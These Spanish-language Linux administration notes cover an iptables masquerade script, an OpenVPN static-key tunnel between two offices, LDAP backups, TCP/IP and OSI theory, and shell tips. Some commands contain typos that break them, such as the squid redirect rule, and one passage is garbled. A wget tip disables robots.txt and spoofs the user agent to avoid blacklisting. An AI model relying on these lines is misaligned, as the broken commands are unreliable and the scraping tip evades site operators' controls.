    * wlan0, una interfaz de red wifi que permite conectar nuestro equipo a una red wifi.

Y supongamos que lo que queremos hacer es poder salir a internet desde cualquier equipo de nuestra red local a traves de cualquier wifi a la que nos conectemos.

#### Pues bien, haciendo uso de iptables (el firewall interno de linux) conseguiremos nuestro objetivo. Para ello, creamos un script similar al siguiente en /etc/init.d y lo llamamos como queramos, por ejemplo: firewall (tenemos que ser root) ####


#!/bin/bash

echo 1 > /proc/sys/net/ipv4/ip_forward

iptables -F
iptables -Z
iptables -X
iptables -F -t nat
iptables -Z -t nat
iptables -X -t nat

iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE

iptables -A INPUT -i eth0 -j ACCEPT



#### Este seria un script basico que nos permitira hacer lo que queremos. Veamos que hacen las reglas de nuestro script: ####


####La primera linea del script define que estamos creando un script bash: ####

#!/bin/bash


#### La segunda linea activa el ip forwarding, que, por decirlo de alguna manera, permite redirigir los paquetes que no son para el propio host. ####

echo 1 > /proc/sys/net/ipv4/ip_forward


#### Cuando el kernel recibe un paquete de red, primero compara la direccion de destino del paquete para ver si es para el propio host. ####
#### Cuando ip_forward esta desactivado (0) y la direccion de destino del paquete es distinta a todas las direcciones locales, ese paquete se descarta. ####
#### Cuando ip_forward esta activado (1) y la direccion de destino del paquete es distinta a todas las direcciones locales, ese paquete se reenvia. ####
#### Por defecto, ip_forward esta desactivado. ####


#### El siguiente conjunto nos permiten limpiar vaciando todas las reglas de iptables que pudiera haber: ####

iptables -F
iptables -Z
iptables -X
iptables -F -t nat
iptables -Z -t nat
iptables -X -t nat


#### La siguiente regla hace que todo el trafico dirigido al interfaz de red wlan0 sea enmascarado: ####

iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE


Y eso es todo. Podemos anadir todas las reglas de filtrado que queramos.


#### Para terminar el trabajo, damos permisos 755 a dicho script: ####

chmod 755 /etc/init.d/firewall


#### Y creamos un enlace en el nivel o niveles que queramos que arranque nuestro script al iniciar la maquina. Por ejemplo, imaginemos que nuestro servidor arranca en el nivel 2: ####

ln -s /etc/init.d/firewall /etc/rc2.d/S99firewall


#### Si ademas, hemos instalado squid en el servidor para filtrar, anadiremos la siguiente regla a nuestro script: ####

iptables -t nat -A PRERROUTING -i eth0 -p TCP -dport 80 -j REDIRECT --to-port 3128   - Esta regla lo que hace es redirigir el trafico http al puerto 3128, que es donde escucha por defecto squid.


#### Por otra parte, si tenemos varias maquinas en nuestra red, por comodidad, podemos montar un dnsmasq en el equipo servidor que asigne direcciones IP a los clientes de nuestra red. ####


#############################################################################################################################################################################################

########################################################################################### openvpn #########################################################################################

#### openvpn

#### openvpn es una solucion de conectividad basada en software: SSL (Secure Sockets Layer) VPN Virtual Private Network (red virtual privada), OpenVPN ofrece conectividad punto-a-punto con validacion jerarquica de usuarios y host conectados remotamente, resulta una muy buena opcion en tecnologias Wi-Fi (redes inalambricas EEI 802.11) y soporta una amplia configuracion, entre ellas balanceo de cargas. Esta publicado bajo la licencia GPL, de software libre.

# Introduccion #

Este articulo tiene como objetivo mostrar de forma rapida y simple la configuracion de un VPN basado en GNU/Linux utilizando OpenVPN como herramienta, siendo que este es un Software estable, simple de configurar es un proyecto que esta siempre en desarrollo. #

Vamos a considerar el caso de conectar las redes internas de una empresa (matriz y sucrusal), siendo que ambas se localizan en lugares diferentes y bien distantes, que cada empresa posee una conexion ADSL rodando GNU/Linux como servidor de sus respectivas redes internas conforma al ejemplo hipotetico de abajo:

# Matriz #

ADSL con IP 200 . 217 . 222 . 222
LAN con la clase 192 . 168 . 1 . 0/24

# Sucrusal #

ADSL con ip 200 . 141 . 64 . 33
LAN con la clase 192 . 168 . 2 . 0/24


En nuestra VPN, tenemos como principal objetivo hacer que cualquier maquina de la red interna de la Matriz se conecte directamente con cualquier maquina de la red interna de la Sucrusal (o vice versa), dejando la impresion de que ambas redes estan en el mismo edificio.


# Instalacion #

Antes de comenzar, devemos fijarnos primeramente si el driver TUN/TAP se encuentra en el Kernel. En el caso de que no se encuentre, necesitaremos activar ese driver dentro de la opcion "Network Device Support", conforme con el ejemplo de abajo:

[*] Network device support
ARCnet devices --->
< > Dummy net driver support
< > Bonding driver support
< > EQL (serial line load balancing) support
<*> Universal TUN/TAP device driver support
< > Ethertap network tap (OBSOLETE)
< > General Instruments Surfboard 1000
Ethernet (10 or 100Mbit) --->
Ethernet (1000 Mbit) --->
[ ] FDDI driver support
[ ] HIPPI driver support (EXPERIMENTAL)
<*> PPP (point-to-point protocol) support
< > SLIP (serial line) support
Wireless LAN (non-hamradio) --->
Token Ring devices --->
[ ] Fibre Channel driver support
< > Red Creek Hardware VPN (EXPERIMENTAL)
< > Traffic Shaper (EXPERIMENTAL)
Wan interfaces --->

No voy a tocar en este articulo temas de compilacion de kernel ni la configuracion del ADSL por cuestiones de tiempo.

# NOTA: En las Distros RedHat 9.0, Slackware 9.1, 10.0 e 10.1 no fue necesario modificar el Kernel. En Slackware 9.0 es necesario recompilar el kernel con soporte al driver TUN/TAP. T  #

Bajamos los paquetes lzo-1.08.tar.gz (biblioteca de compresion de datos) y el paquete openvpn-1.5.0.tar.gz.

# 1? Paso #

$ tar -xzvf lzo-1.08.tar.gz
$ cd lzo-1.08
$ ./configure
$ make
$ su
# make install

# 2? Paso #

$ tar -xzvf openvpn-1.5.0.tar.gz
$ cd openvpn-1.5.0
$ ./configure
$ make
$ su
# make install

Ahora el OpenVPN ya esta instalado en nuestro sistema con soporte a la biblioteca de compresion de datos. Ahora solo resta configurar nuestra VPN.

# Configuracion de la Matriz #

# Configurando nuestra VPN en la Matriz: #

El OpenVPN puede operar 3 tipos de cifrado. Ninguna crippode operar con 3 tipos de cifrado. Ningun cifrado(solo el tunel), cifrado con llaves estaticas en modo TLS, en que las llaves son cambiadas periodicamente. En nuestro ejemplo, usaremos cifrado con llaves estaticas..

# 1 - Ejecute los seguintes comandos: #

# Creamos el directorio donde estaran los archivos de configuracion. #

mkdir /etc/openvpn

# Fue creada una llave de cifrado con el nombre llave (puede ser cualquier nombre de archivo) dentro del directorio /etc/openvpn. #

openvpn --genkey -secret /etc/openvpn/llave

# Solo para visualizar el contenido de la llave que generamos. #

cat /etc/openvpn/llave

# Cree ese archivo con el siguiente contenido: #

touch /etc/openvpn/matriz.conf


# Usar como interface o driver TUN
dev tun

# 10 . 0 . 0 . 1 ip que sera asumido en la matriz
# 10 . 0 . 0 . 2 ip remoto, ese sera el ip de la sucursal
ifconfig 10 . 0 . 0 . 1 10 . 0 . 0 . 2

# Entra en el directorio donde se encuentran los archivos de configuracion
cd /etc/openvpn

# Indica que ese tunel posee una llave de cifrado #
secret llave

# OpenVPN usa el puerto 5000/UDP por defecto. Cada tunel de OpenVPN debe usar un puerto diferente. El estandar es el puerto 5000 #
port 5000

# Usuario que correra el daemon del OpenVPN #
user winner

# Grupo que correra el daemon do OpenVPN
group winner

# Usa la biblioteca lzo #
comp-lzo

# Envia un ping via UDP para la parte remota a cada 15 segundos para mantener la conexion de pie en el firewall statefull Muy recomendado, igual si no se usa un firewall basado en statefull. #
ping 15

# Nivel de log #
verb 3


# En seguida, vamos a iniciar la conexion del servidor, faltando apenas configurar la sucursal. Ejecute el siguiente comando en el servidor de la Matriz: #

openvpn --config /etc/openvpn/matriz.conf -daemon

ifconfig tun0

tun0 Link encapoint-to-Point Protocol
inet addr:10 . 0 . 0 . 1 P-t-P:10 . 0 . 0 . 2 Mask:255 . 255 . 255 . 255
UP POINTOPOINT RUNNING NOARP MULTICAST MTU:1255 Metric:1
RX packets:1383257 errors:0 dropped:0 overruns:0 frame:0
TX packets:1144968 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:10
RX bytes:82865921 (79.0 Mb) TX bytes:383951667 (366.1 Mb)


# Si aparece algo parecido significa que el tunel de la Matriz ya esta pronto a la espera de la conexion de la sucursal. #


# Configuracion de la sucursal #

# Configurando nuestra VPN en la sucursal: #

La instalacion en la sucursal tiene que ser exactamente igual a la de la Matriz, y solo seguir los pasos descritos en la parte de instalacion.

# Ya en la parte de configuracion, no cambia mucho las cosas, pues el mayor trabajo es simplemente copiar la llave que generamos en la Matriz con un canal seguro hasta la sucursal. Ejecutamos los siguientes comando. Crearemos el mismo directorio de configuracion en la sucursal : #

mkdir /etc/openvpn

# Copie la llave generada en la matriz para la filial con el siguiente comando: #

scp /etc/openvpn/llave ip_filial:/etc/openvpn

# A continuacion creamos el archivo de configuracion llamado sucursal.conf: #

touch /etc/openvpn/sucursal.conf

# Creamos el archivo con el siguiente contenido: #

Usar como interface el driver TUN
dev tun

# 10 . 0 .0 . 1 ip que sera asumido en la matriz
# 10 . 0 . 0 . 2 ip remoto, este seria el ip de la sucursal
ifconfig 10 . 0 . 0 . 2 10 . 0 . 0 . 1
# Indica donde esta la ip de la Matriz (es la unica linea que anadimos en el archivo de configuracion de la sucursal), el resto es todo igual. #
remote 200 . 217 . 222 . 222

# Entra en el directorio donde se encuentran los archivos de configuracion #
cd /etc/openvpn

# Indica que ese tunel posee una llave de cifrado #
secret llave

# OpenVPN usa el puerto 5000/UDP por defecto. Cada tunel del OpenVPN debe usar un puerto diferente. por defecto el puerto 5000 #
port 5000

# Usuario que ejecutara el daemon del OpenVPN #
user winner

# Grupo que ejecutara el daemon del OpenVPN #
group winner

# Usa la biblioteca lzo
comp-lzo

# Envia un ping via UDP para la parte remota cada 15 segundos para manter la conexion de pie en firewall statefull Muy recomendado, igual si no utilizas un firewall basado e statefull. #
ping 15

# Nivel de log
verb 3


# Inicie la conexion en la sucursal con el siguiente comando: #

openvpn --config /etc/openvpn/sucursal.conf -daemon

ifconfig tun0

tun0 Link encapoint-to-Point Protocol
inet addr:10 . 0 . 0 . 2 P-t-P:10 . 0 . 0 . 1 Mask:255 . 255 . 255 . 255
UP POINTOPOINT RUNNING NOARP MULTICAST MTU:1255 Metric:1
RX packets:1383257 errors:0 dropped:0 overruns:0 frame:0
TX packets:1144968 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:10
RX bytes:82865921 (79.0 Mb) TX bytes:383951667 (366.1 Mb)


# Ok! si apareciera algo similar a esto, sua VPN, esta ejecutandose!!! Pruebe haciendo ping de una puerta a otra: #

ping 10 . 0 . 0 . 1

PING 10 . 0 . 0 . 1 (10 . 0 . 0 . 1) 56(84) bytes of data.
64 bytes from 10 . 0 . 0 . 1: ICMP_seq=1 TTL=63 time=11.9 ms
64 bytes from 10 . 0 . 0 . 1: ICMP_seq=2 TTL=63 time=6.09 ms
64 bytes from 10 . 0 . 0 . 1: ICMP_seq=3 TTL=63 time=5.93 ms
64 bytes from 10 . 0 . 0 . 1: ICMP_seq=4 TTL=63 time=8.15 ms
64 bytes from 10 . 0 . 0 . 1: ICMP_seq=5 TTL=63 time=6.19 ms

# Si aparece algo similar a esto, su VPN ya esta funcionando ahora solo falta adicionar las rutas para las redes internas se vean. #


# Adicionando rutas #

# NOTA: Antes de adicionar las rutas, es necesario activar el ruteamiento en el kernel en ambas puntas (Matriz y Sucursal). Ejecute los siguientes comando en la matriz y la sucursal: #

echo 1 > /proc/sys/net/ipv4/ip_forward

# Para adicionar la ruta con destino a la red de la sucursal, ejecute dentro del servidor matriz el siguiente comando: #

route add -net 192 . 168 . 2 . 0 / 24 gw 10 . 0 . 0 . 2

# Para adicionar la ruta con destino a la red de la Matriz, ejecute desde el servidor de la Sucursal el siguiente comando: #

route add -net 192 . 168 . 1 . 0 / 24 gw 10 . 0 . 0 . 1

Bien ahora solo sobra testear. Intente dar ping dentro de una maquina de LAN de la Matriz con destino LAN de la Sucursal. Tambien tenemos que colocar toda la secuencia de comando en rc.local de su distro, para que la misma cargue las configuraciones al iniciar el sistema operativo.

Para terminar, podemos tambien configurar un servidor Wins con Samba o window$ nt/2000 para que ambos sean visualizadas en la red de window$.



#############################################################################################################################################################################################

############################################################################################# ldap ##########################################################################################

#### ldap

Si trabajamos con un servidor de ldap, es bueno hacer copia de seguridad de la base de datos de ldap de vez en cuando, con el fin de recuperar el servicio lo antes posible si hubiera cualqui$


#### Hacer copia de seguridad de nuestra BD de ldap es tan sencillo como ejecutar el comando slapcat y redirigir la salida del mismo a un archivo. Eso si. Es conveniente parar el servidor an$

# /etc/init.d/slapd stop; slapcat > backup-ldap.ldif; /etc/init.d/slapd start

#### Restaurar la copia de seguridad tambien es sencillo: ####

# /etc/init.d/slapd stop

# slapadd -l backup-ldap.ldif

# slapindex -vf /etc/ldap/slapd.conf

# /etc/init.d/slapd start


#############################################################################################################################################################################################

########################################################################################### tcp/ip ##########################################################################################

#### protocolo tcp/ip

#### historia ####

TCP/IP fue desarrollado y presentado por el Departamento de Defensa de EE.UU. En 1972 y fue aplicado en ARPANET (Advanced Research Projects Agency Network), que era la red de area extensa del Departamento de Defensa como medio de comunicacion para los diferentes organismos de EE.UU. La transicion hacia TCP/IP en ARPANET se concreto en 1983.

Se conoce como familia de protocolos de Internet al conjunto de protocolos de red que son implementados por la pila de protocolos sobre los cuales se fundamenta Internet y que permiten la transmision de datos entre las redes de computadoras.

Los dos protocolos mas importantes, y que fueron tambien los primeros en definirse y tambien los mas utilizados, son TCP (Protocolo de Control de Transmision o Transmission Control Protocol) e IP (Protocolo de Internet o Internet Protocol), de ahi que se denomine tambien como Conjunto de Protocolos TCP/IP. Los tipos de protocolos existentes superan los cien, ente los cuales podemos mencionar como los mas conocidos a HTTP, FTP, SMTP, POP, ARP, etc.

TCP/IP es la plataforma que sostiene Internet y que permite la comunicacion entre diferentes sistemas operativos en diferentes computadoras, ya sea sobre redes de area local (LAN) o redes de area extensa (WAN).


#### Niveles de pila ####

En la actualidad continua la discusion respecto a si el modelo TCP/IP de cinco niveles encaja dentro del modelo OSI (Interconexion de Sistemas Abiertos u OpenSystems Interconnection) de siete niveles.


#### Modelo TCP/IP ####

Utiliza encapsulamiento para proveer la abstraccion de protocolos y servicios hacia diferentes capas en la pila. La pila consiste de cinco niveles:

#### 5 Aplicacion ####

Se compone de diversos protocolos de servicios como:

DNS (Domain Name System)
TLS/SSL (Transport Layer Security)
TFTP (Trivial File Transfer Protocol)
FTP (File Transfer Protocol)
HTTP (Hyper Text Transfer Protocol)
IMAP (Internet Messsage Access Protocol)
IRC (Internet Relay Chat)
NNTP (Network News Transfer Protocol)
POP3 (Post Office Protocol)
SIP (Session Iniciation Protocol)
SMTP (Simple Mail Transfer Protocol)
SNMP (Simple Network Management Protcol)
SSH (Secure Shell)
TELNET
BitTorrent
RTP (Real-time Transport Protocol)
rlogin
ENRP (Endpoint Handlespace Redundancy Protocol)
Los protocolos de encaminamiento como BGP (Border Gateway Protocol) y RIP (Routing Information Protocol) que utilizan transporte por TCP y UDP respectivamente pueden ser considerados como parte de esta capa.

#### 4 Transporte ####

Se compone de diversos protocolos de servicios como:

TCP (Transmision Control Protocol)
UDP (User Datagram Protocol),
DCCP (Datagram Congestion Control Protocol)
SCTP (Stream Control Transmision Protococol)
IL (Internet Link Protocol, similar a TCP pero mas simple)
RUDP (Reliable User Datagram Protocol), etc.
Los protocolos como OSPF (Open Shortest Path First), que corren sobre IP, pueden ser tambien considerados como parte de esta capa. ICMP (Internet Control Message Protocol) e IGMP (Internet Group Management Protocol) que tambien utilizan IP pueden ser considerados parte del Nivel de Red.

#### 3 Red ####

Se compone de diversos protocolos de servicios como IP (incluyendo IPv4 e IPv6). Protocolos como ARP (Address Resolution Protocol) y RARP (Reverse Address Resolution Protocol) operan por debajo de IP, pero arriba del Nivel de enlace, de modo que pertenecen a un punto intermedio entre el Nivel de Red y el Nivel de Enlace.

#### 2 Enlace ####

Compuesto de protocolos como:

Ethernet
Wi-Fi
Token ring
PPP (Point-to-Point Protocol)
SLIP (Serial Line Internet Protocol)
FDDI (Fiber Distributed Data Interface)
ATM (Asynchronous Transfer Protocol)
Frame Relay
SMDS (Switched Multi-megabit Data Services)

#### 1 Fisico ####

#### Medio fisico ####

Los niveles mas cercanos altos son los mas cercanos al usuario, mientras que los que estan mas hacia abajo estan mas cercanos a la transmision fisica de los datos. Salvo por evidentes razones en el primer y ultimo niveles, cada nivel tiene un nivel superior y un nivel inferior que, respectivamente, o bien utilizan un servicio del nivel o proveen un servicio. Un metodo de abstraccion para entender esto es mirar los niveles como proveedores o consumidores de servicios. Ejemplo: TCP en el nivel de transporte requiere un protocolo del nivel de Red, como seria IPv4, el cual a su vez requiere de un protocolo del nivel de enlace, siendo TCP un proveedor de servicio para los protocolos del nivel de aplicacion.

#### Nivel de aplicacion ####

Es el nivel que utilizan los programas de red mas comunes a fin de comunicarse a traves de una red. La comunicacion que se presenta en este nivel es especifica de las aplicaciones y los datos transportados desde el programa estan en el formato utilizado por la aplicacion y van encapsulados en un protocolo del Nivel de Transporte. Siendo que el modelo TCP/IP no tiene niveles intermedios, el nivel de Aplicacion debe incluir cualquier protocolo que actue del mismo modo que los protocolos del Nivel de Presentacion y Nivel de Sesion del Modelo OSI. Los protocolos del Nivel de Transporte mas comunmente utilizados son TCP y UDP, mismos que requieren un puerto disponible y especifico para el servicio para los servidores y puertos efimeros. Aunque los encaminadores (routers) e interruptores (switches) no utilizan este nivel, las aplicaciones que controlan el ancho de banda si lo utilizan.

#### Nivel de Transporte ####

Este nivel principalmente provee lo necesario para conectar aplicaciones entere si a traves de puertos. Mientras que IP (Internet Protocol),del Nivel de Red,provee solamente la mejor forma de entrega, el nivel de transporte es el primer nivel que se encarga de la fiabilidad. De entre todos los protocolos de este nivel, tanto TCP como UDP son utilizados para transportar un gran numero de aplicaciones de alto nivel. Las aplicaciones en cualquier nivel se distinguen a traves de los puertos TCP o UDP que utilicen.


#### TCP ####

El mejor ejemplo de este nivel es TCP, que es un protocolo orientado hacia conexion que resuelve numerosos problemas de fiabilidad para proveer una transmision de bytes fiable ya que se encarga de que los datos lleguen en orden, tenga un minimo de correcciones de errores, se descarten datos duplicados, se vuelvan a enviar los paquetes perdidos o descartados e incluya control de congestion de trafico.

#### La conexiones a traves de TCP tienen tres fases: ####

#### Establecimiento de la conexion ####

Antes de que el cliente intente conectarse con el servidor, este ultimo debe primero ligarse hacia el puerto para abrirlo para las conexiones, es decir, una apertura pasiva. Una vez establecida el cliente puede iniciar la apertura activa. Se requiere de un saludo de tres etapas:

La apertura activa se realiza enviando un paquete SYN (sincroniza) hacia el servidor.En respuesta, el servidor responde con un paquete SYN-ACK (conformacion de sincronizacion).Finalmente el cliente envia un paquete ACK (confirmacion) de regreso hacia el servidor. En este punto tanto cliente como servidor han recibido una conformacion de la conexion

#### Transferencia de datos. ####

#### Hay tres funciones clave que diferencian a TCP de UDP: ####

Transferencia de datos libre de errores.
Transferencia de datos ordenada.
Retransmision de paquetes perdidos.
Descartado de paquetes duplicados.
Ajuste en la congestion de la transmision de datos.
Terminacion de la conexion.

Esta etapa utiliza un saludo de tres vias, con cada extremo de la conexion terminando independientemente. Cuando una de los extremos desea detener su parte de la conexion, envia un paquete FIN, que la otra parte confirma con un paquete ACK. Por tanto una interrupcion de la conexion requiere un par de paquetes FIN y ACK desde cada lado de la conexion TCP.

Una conexion puede quedar abierta a medias cuando uno de los extremos ha terminado la conexion desde su lado pero el otro extremo no. El extremo que termino la conexion ya no puede enviar datos en la conexion, pero el el otro extremo si.

El metodo mas comun sea un saludo de tres etapas donde un anfitrion A envia un paquete FIN y el anfitrion B responde con un paquete FIN y un ACK (en el mismo paso) y el anfitrion A responde con un paquete ACK.

#### TCP realiza las siguientes etapas en su zocalo: ####

LISTEN
SYN-SENT
SYN-RECEIVED
ESTABLISHED
FIN-WAIT-1
FIN-WAIT-2
CLOSE-WAIT
CLOSING
LAST-ACK
TIME-WAIT
CLOSED
LISTEN representa la conexion en espera de peticiones desde cualquier puerto TCP remoto. SYN-SENT representa la espera del TCP remoto para enviar de regreso 
el paquete TCP estableciendo banderas SYN y ACK. SYN-RECIVED representa la espera para el TCP remoto para enviar de regreso la confirmacion despues de haber 
enviado de regreso otra confirmacion de conexion al TCP remoto (establecido por el servidor TCP). ESTABLISHED representa que el puerto esta listo para 
recibir/enviar datos desde/hacia el TCP remoto (lo hacen tanto clientes como servidores TCP). TIME-WAIT representa el tiempo de espera necesario para 
asegurar que el TCP remoto ha recibido la confirmacion de su solicitud de terminacion de la conexion.


#### UDP ####

UDP, a veces referido sarcasticamente como Unreliable Datagram Protocol (Protcolo no fiable de datagrama), es un protocolo de datagrama sin correccion; no provee las garantia de fiabilidad y ordenamiento de TCP a los protocolos del Nivel de Aplicacion y los datagramas pueden llegar en desorden o perderse sin notificacion. Como consecuencia de lo anterior es que UDP es un protocolo mas rapido y eficiente para tareas ligeras o sensibles al tiempo proveiendo una interfaz muy simple entre el Nivel de Red y Nivel de Aplicacion. Si se requiere algun tipo de fiabilidad para los datos transmitidos, esta debe ser implementada en los niveles superiores de la pila.

Al igual que IP, y a diferencia de TCP, es un protocolo de mejor esfuerzo o no-fiable. El unico problema de fiabilidad que resuelve es la correccion de errores en la cabecera y datos transmitidos a traves de un campo de 16 bits para suma de verificacion (checksum), una forma de control de redundancia con la finalidad de proteger la integridad de datos verificando que no hayan sido corrompidos.

#### La estructura de paquetes UDP consiste de 4 campos ####

Puerto de origen: Encargado de identificar el puerto que envia y que se asume sera el puerto hacia donde se envia la respuesta si se necesita. Este campo es opcional: si no se utiliza, el valor del campo debe ser 0.

Puerto de destino: Identifica el puerto de destino. Es obligatorio.

Longitud: Un campo de 16 bits que especifica la longitud del datagrama completo: cabecera y datos. La longitud minima es de 8 bytes ya que es la longitud misma de la cabecera.

Suma de verificacion: Un campo de 16 bits que se utiliza para verificar errores en cabecera y datos.

Las aplicaciones mas comunes que hacen uso de este tipo de protocolo son DNS, aplicaciones de transmision de medios, voz sobre IP (VoIP), TFTP y juegos en linea.


#### SCTP ####

SCTP: es un mecanismo de transporte fiable orientado hacia conexion. Esta orientado tambien hacia transmision de datos pero no esta orientado hacia bytes como TCP. Provee multiples transmisiones distribuidos sobre una misma conexion. Puede ademas representar una conexion con multiples direcciones IP de modo que si una IP falla, la conexion no se interrumpe. Se desarrollo inicialmente para aplicaciones de telefonia pero se puede utilizar en otras aplicaciones.

#### DCCP ####

DCCP: se encuentra en fase de desarrollo y bajo la tutela de la IETF (Internet Engineering Task Force) que pretende proveer la semantica de control de flujo de TCP y el modelo de servicio de datagrama de UDP a la vista del usuario.

#### RTP ####

RTP es un protocolo de datagrama que fue disenado para datos en tiempo real como la transmision de audio y video. Es un nivel de sesion que utiliza el formato de paquetes de UDP como base. Sin embargo se considera que pudiera acomodar debajo del nivel de transporte del modelo TCP/IP.

#### Nivel de Red ####

Este nivel resuelve el problema de capturar los datos a traves de una red unica. IP (Internet Protocol) realiza la tarea basica de capturar los paquetes de datos desde una fuente hacia un destino. IP puede transportar datos para una gran cantidad de protocolos del nivel superior (Nivel de Transporte). Otro ejemplo de protocolo de este nivel es X.25, que es un conjunto de protocolos para redes WAN utilizando lineas telefonicas o sistema ISDN.

#### Nivel de Enlace ####

Este nivel no es realmente parte del Conjunto de Protocolos TCP/IP, sino que es el metodo utilizado para pasar paquetes desde el Nivel de Red sobre dos diferentes anfitriones. Este proceso puede ser controlado a traves de la programatica utilizada como controlador del dispositivo para una tarjeta de red asi como tambien sobre la Programacion en firme (Firmware) o circuitos integrados auxiliares (chipsets). estos procesos realizaran funciones de enlace de datos tales como anadir una cabecera de paquete para preparar la transmision, y entonces transmitir el todo a traves de un medio fisico. Este nivel es donde los paquetes son interceptados y enviados hacia una Red Privada Virtual (VPN). Cuando esto se lleva a acabo, los datos del Nivel de Enlace se consideran como los datos de la aplicacion y procede descendiendo por la pila del modelo TCP/IP para realizar la verdadera transmision. En el extremo receptor, los datos suben por la pila del modelo TCP/IP dos veces, una para la VPN y otra para el encaminamiento (routing).

#### Nivel Fisico ####

Al igual que el Nivel de Enlace, no es realmente parte del Conjunto de Protocolos TCP/IP. Contempla todas las caracteristicas fisicas de la comunicacion como la naturaleza del medio, detalles de conectores, codigo de canales y modulacion, potencias de senal, longitudes de onda, sincronizacion y tiempo de vida y distancias maximas.


#### Modelo OSI ####

El Conjunto de Protocolos TCP/IP (y su correspondiente pila) han sido utilizados antes de que se estableciera el modelo OSI (Interconexion de Sistemas Abiertos u Open Systems Interconnection) y desde entonces el modelo TCP/IP ha sido comparado con el modelo OSI tanto en libros como en instituciones educativas. Ambas se relacionan pero no son equiparables. El modelo OSI utiliza siete niveles, mientras que el modelo TCP/IP utiliza cinco niveles. Los dos niveles que hacen la diferencia en el Modelo OSI son el Nivel de Presentacion y el Nivel de Sesion, mismo que podrian ser equivalentes al Nivel de Aplicacion del modelo TCP/IP.
Del mismo modo que la pila del modelo TCP/IP, el modelo OSI no es lo suficientemente diverso en los niveles inferiores para abarcar las verdaderas capacidades del Conjunto de Protocolos TCP/IP. Un claro ejemplo es que falta un nivel intermedio para para acomodar entre el Nivel de Red y el Nivel de Transporte para poder determinar donde corresponden los protocolos ICMP e IGMP, y otro nivel intermedio entre el Nivel de Red y el Nivel de Transporte para determinar donde corresponden los protocolos ARP y RARP.

#### 7 Aplicacion ####

HTTP, SMTP, SNMP, FTP, Telnet, SIP, SSH, NFS, RTSP, XMPP (Extensible Messaging and Presence Protocol), Whois, ENRP Telnet.

#### 6 Presentacion ####

XDR (External Data Representation), ASN.1 (Abstract Syntax Notation 1), SMB (Server Message Block),AFP (Apple Filing Protocol), NCP (NetWare Core Protocol)

#### 5 Sesion ####

ASAP (Aggregate Server Access Protocol), TLS, SSH, ISO 8327 / CCITT X.225, RPC (Remote Procedure Call), NetBIOS, ASP (Appletalk Session Protocol), Winsock, BSD sockets

#### 4 Transporte ####

TCP, UDP, RTP, SCTP, SPX, ATP, IL

#### 2 Enlace de datos ####

Ethernet, Token ring, HDLC, Frame relay, ISDN, ATM, 802.11 WiFi, FDDI, PPP

#### 1 Fisico ####

Define todas las especificaciones fisicas y electricas de los dispositivos, como son disposicion de pines, voltajes, especificaciones de cableado, concentradores, repetidores, adaptadores de red, etc.
Cable, Radio, fibra optica, Red por palomas.
Los niveles 7 al 4 se clasifican como niveles de anfitrion, mientras que los niveles inferiores del 1 al 3 se clasifican como niveles de medios.


#############################################################################################################################################################################################

############################################################################################ tricks #########################################################################################

#### tricks ####

#### Runs previous command replacing foo by bar every time that foo appears Very useful for rerunning a long command changing some arguments globally. As opposed to ^foo^bar, which only repl$

!!:gs/foo/bar

#### Rapidly invoke an editor to write a long, complex, or tricky command Next time you are using your shell, try typing ctrl-x e (that is holding control key press x and then e). The shell $

ctrl-x e

#### Check command history, but avoid running it !whatever will search your command history and execute the first command that matches 'whatever'. If you don't feel safe doing this put :p on$

!whatever:p

#### hacer una copia de seguridad de un archivo conservando el mismo nombre pero anadiendole .back al final - quickly backup or copy a file with bash ####

cp archivo{,.back}

#### Runs previous command but replacing Really useful for when you have a typo in a previous command. Also, arguments default to empty so if you accidentally run: echo "no typozs" you can c$

^foo^bar
 
#### Run the last command as root Useful when you forget to use sudo for a command. "!!" grabs the last run command ####

sudo !!

#### ordenar la salida del comando "mount" haciendolo mas facil de leer y entender - list currently mounted filesystems in nice layout ####

mount | column -t

#### Mount a temporary ram partition Makes a partition in ram which is useful if you need a temporary working space as read/write access is fast. Be aware that anything saved in this partiti$

mount -t tmpfs tmpfs /mnt -o size=1024m

#### Query Wikipedia via console over DNS Query Wikipedia by issuing a DNS query for a TXT record. The TXT record will also include a short URL to the complete corresponding Wikipedia entry.$

dig +short txt <keyword>.wp.dg.cx

#### funcion para copiar un archivo y ver la barra de progreso usando pv y agregando esta funcion a .bashrc ####

cp_p() { if [ `echo "$2" | grep ".*/$"` ]; then pv "$1" > "$2""$1"; else pv "$1" > "$2"/"$1"; fi; }

#### hacer una copia de seguridad de un archivo conservando el mismo nombre pero anadiendole .back al final - quickly backup or copy a file with bash ####

cp archivo{,.back}

#### Like top, but for files ####

watch -d -n 2 'df; ls -FlAt;'

#### Download an entire website ####

wget --random-wait -r -p -e robots=off -U mozilla http://www.example.com

-p parameter tells wget to include all files, including images.

-e robots=off you don't want wget to obey by the robots.txt file

-U mozilla as your browsers identity.

--random-wait to let wget chose a random number of seconds to wait, avoid get into black list.

# Other Useful wget Parameters: #

--limit-rate=20k limits the rate at which it downloads files.

-b continues wget after logging out.

-o $HOME/wget_log.txt logs the OUTPUT

#### List the size (in human readable form) of all sub folders from the current location ####

du -h --max-depth=1

#### programa ncurses para "du" ####

ncdu

#### A very simple and useful stopwatch ####

time read (ctrl-d to stop)

# time read -sn1 (s:silent, n:number of characters. Press any character to stop) #

#### Quick access to the ascii table. ####

man ascii

#### Shutdown a Windows machine from Linux ####

net rpc shutdown -I ipAddressOfWindowsPC -U username%password

# This will issue a shutdown command to the Windows machine. username must be an administrator on the Windows machine. Requires samba-common package installed. Other relevant commands are: #

net rpc shutdown -r : reboot the Windows machine

net rpc abortshutdown : abort shutdown of the Windows machine

# to show all relevant commands type: #

net rpc

#### Jump to a directory, execute a command and jump back to current dir ####

(cd /tmp && ls)

#### Display the top ten running processes - sorted by memory usage ####

ps aux | sort -nk +4 | tail

# ps returns all running processes which are then sorted by the 4th field in numerical order and the top 10 are sent to STDOUT. #

#### List of commands you use most often ####

history | awk '{a[$5]++}END{for(i in a){print a[i] " " i}}' | sort -rn | head

#### Reboot machine when everything is hanging (raising a skinny elephant) ####

<alt> + <print screen/sys rq> + <R> - <S> - <E> - <I> - <U> - <B>

# If the machine is hanging and the only help would be the power button, this key-combination will help to reboot your machine (more or less) gracefully. #

R - gives back control of the keyboard

S - issues a sync

E - sends all processes but init the term singal

I - sends all processes but init the kill signal

U - mounts all filesystem ro to prevent a fsck at reboot

B - reboots the system

# nota: Save your file before trying this out, this will reboot your machine without warning! http://en.wikipedia.org/wiki/Magic_SysRq_key #

